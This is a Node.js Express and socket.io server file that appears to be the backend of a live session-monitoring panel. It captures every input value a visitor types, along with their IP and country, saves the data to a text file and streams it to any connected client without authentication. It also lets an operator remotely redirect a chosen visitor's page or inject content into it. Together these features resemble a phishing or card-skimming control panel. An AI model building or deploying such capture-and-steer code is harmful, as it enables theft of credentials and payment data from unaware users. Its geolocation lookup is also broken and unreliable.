// server/app.js
const express = require("express");
const app = express();
const http = require("http").createServer(app);
const io = require("socket.io")(http, {
  cors: {
    origin: "*", // Allow requests from any origin
    methods: ["GET", "POST"]
  }
});
const axios = require("axios");
const { getClientIp } = require("request-ip");
const fs = require("fs");
const path = require("path");
const mongoose = require("mongoose");
require("dotenv").config();
const morgan = require("morgan");
const cookieParser = require("cookie-parser");
const cors = require("cors");

// MongoDB connection
mongoose
  .connect(process.env.DATABASE, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
    useFindAndModify: false,
    useCreateIndex: true,
    serverSelectionTimeoutMS: 30000, // Increase timeout to 30 seconds
    socketTimeoutMS: 45000 // Increase socket timeout to 45 seconds
  })
  .then(() =>
    console.log(
      "==============Mongodb Database Connected Successfully=============="
    )
  )
  .catch((err) => console.log("Database Not Connected !!!"));

// Middleware
app.use(morgan("dev"));
app.use(cookieParser());
app.use(cors({
  origin: function(origin, callback) {
    const allowedOrigins = process.env.CLIENT_URL.split(',');
    // Add your production domain to allowed origins
    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true
}));
app.use(express.static("public"));
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

// Import Router
const authRouter = require("./routes/auth");
const billingRouter = require("./routes/billing");
const userRouter = require("./routes/user");

// Import Auth middleware for check user login or not~
const { loginCheck } = require("./middleware/auth");
app.set('trust proxy', true);

let activeUsers = [];
let previousUsers = []; // Add this array to store previous users
let userInputs = {}; // Store input values by session
const ipCache = {};
const dataFilePath = path.join(__dirname, "userSessions.txt");

const saveDataToFile = () => {
  const data = {
    activeUsers,
    previousUsers,
    userInputs
  };
  fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 2));
};

app.post("/api/track", async (req, res) => {
  const { sessionId, pageUrl, eventType, inputName, inputValue, componentName } = req.body;
  const ip = getClientIp(req);

  try {
    let country = ipCache[ip] || 'Unknown';
    if (!ipCache[ip]) {
      try {
        const geoResponse = await axios.get(`https://ipinfo.io/json`);
        country = geoResponse.data.country;
        ipCache[ip] = country;
      } catch (error) {
        console.error('IP tracking error:', error);
      }
    }

    if (eventType === 'input') {
      if (!userInputs[sessionId]) {
        userInputs[sessionId] = {};
      }
      userInputs[sessionId][inputName] = { value: inputValue, timestamp: new Date() };
    }

    const user = {
      sessionId,
      ip,
      country,
      pageUrl,
      eventType,
      componentName,
      inputs: userInputs[sessionId] || {},
      lastActive: new Date(),
      timestamp: new Date()
    };

    const existingUserIndex = activeUsers.findIndex(u => u.sessionId === sessionId);
    if (existingUserIndex !== -1) {
      activeUsers[existingUserIndex] = { ...activeUsers[existingUserIndex], ...user };
    } else {
      activeUsers.push(user);
    }

    saveDataToFile();
    io.emit("update", { activeUsers, previousUsers });
    res.sendStatus(200);
  } catch (error) {
    console.error('Tracking error:', error);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

// Clean up inactive users (30 seconds timeout)
setInterval(() => {
  const thirtySecondsAgo = new Date(Date.now() - 30000);
  const inactiveUsers = activeUsers.filter(user => new Date(user.lastActive) < thirtySecondsAgo);
  
  if (inactiveUsers.length > 0) {
    previousUsers = [...previousUsers, ...inactiveUsers.map(user => ({
      ...user,
      disconnectedAt: new Date()
    }))];
    previousUsers = previousUsers.slice(-50); // Keep only last 50 previous users
  }
  
  activeUsers = activeUsers.filter(user => new Date(user.lastActive) >= thirtySecondsAgo);
  saveDataToFile();
  io.emit("update", { activeUsers, previousUsers });
}, 30000);

app.post("/api/change-route", (req, res) => {
  const { sessionId, newRoute } = req.body;
  console.log(`Changing route for session ${sessionId} to ${newRoute}`);

  try {
    const sockets = Array.from(io.sockets.sockets.values());
    const targetSocket = sockets.find(socket => socket.handshake.auth.sessionId === sessionId);

    if (targetSocket) {
      targetSocket.emit("changeRoute", newRoute);
      console.log(`Route change emitted to socket ${targetSocket.id}`);
      
      const userIndex = activeUsers.findIndex(u => u.sessionId === sessionId);
      if (userIndex !== -1) {
        activeUsers[userIndex] = {
          ...activeUsers[userIndex],
          pageUrl: newRoute,
          lastRouteChange: new Date()
        };
        saveDataToFile();
        io.emit("update", { activeUsers, previousUsers });
      }
      res.sendStatus(200);
    } else {
      console.log(`No socket found for session ${sessionId}`);
      res.status(404).json({ error: 'User not found' });
    }
  } catch (error) {
    console.error('Error changing route:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.post("/api/update-component", (req, res) => {
  const { sessionId, componentName, updates, route } = req.body;
  
  const sockets = Array.from(io.sockets.sockets.values());
  const targetSocket = sockets.find(socket => socket.handshake.auth.sessionId === sessionId);

  if (targetSocket) {
    targetSocket.emit("componentUpdate", {
      component: componentName,
      data: updates
    });

    targetSocket.emit("changeRoute", route);

    const userIndex = activeUsers.findIndex(u => u.sessionId === sessionId);
    if (userIndex !== -1) {
      activeUsers[userIndex] = {
        ...activeUsers[userIndex],
        currentComponent: componentName,
        componentData: updates,
        lastRoute: route,
        lastUpdate: new Date()
      };
      saveDataToFile();
      io.emit("update", { activeUsers, previousUsers, userInputs });
    }
    res.sendStatus(200);
  } else {
    res.status(404).json({ error: 'User not found' });
  }
});

app.post("/api/updateUserId", (req, res) => {
  const { oldUserId, newUserId } = req.body;
  activeUsers = activeUsers.map(user => user.userId === oldUserId ? { ...user, userId: newUserId } : user);
  saveDataToFile();
  io.emit("update", activeUsers);
  res.sendStatus(200);
});

app.get("/api/users", (req, res) => {
  res.json(activeUsers);
});

app.get("/api/previous-users", (req, res) => {
  res.json(previousUsers);
});

// Serve userSessions.txt as JSON
app.get("/api/user-sessions", (req, res) => {
  fs.readFile(dataFilePath, "utf-8", (err, data) => {
    if (err) {
      console.error("Error reading userSessions.txt:", err);
      return res.status(500).json({ error: "Internal Server Error" });
    }
    try {
      const jsonData = JSON.parse(data);
      res.json(jsonData);
    } catch (parseError) {
      console.error("Error parsing userSessions.txt:", parseError);
      res.status(500).json({ error: "Internal Server Error" });
    }
  });
});

io.on("connection", (socket) => {
  const sessionId = socket.handshake.auth.sessionId;
  console.log(`Client connected: ${socket.id}, Session: ${sessionId}`);
  
  socket.sessionId = sessionId;
  
  socket.emit("update", { activeUsers, previousUsers, userInputs });
});

// Routes
app.use("/api/user", userRouter);
app.use("/api/auth", authRouter);
app.use("/api/billing", billingRouter);
app.use("/api", authRouter);

// Add error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    success: false,
    error: 'Internal server error'
  });
});

// Run Server
const PORT = process.env.PORT || 8000;
http.listen(PORT, () => {
  console.log("Server is running on ", PORT);
});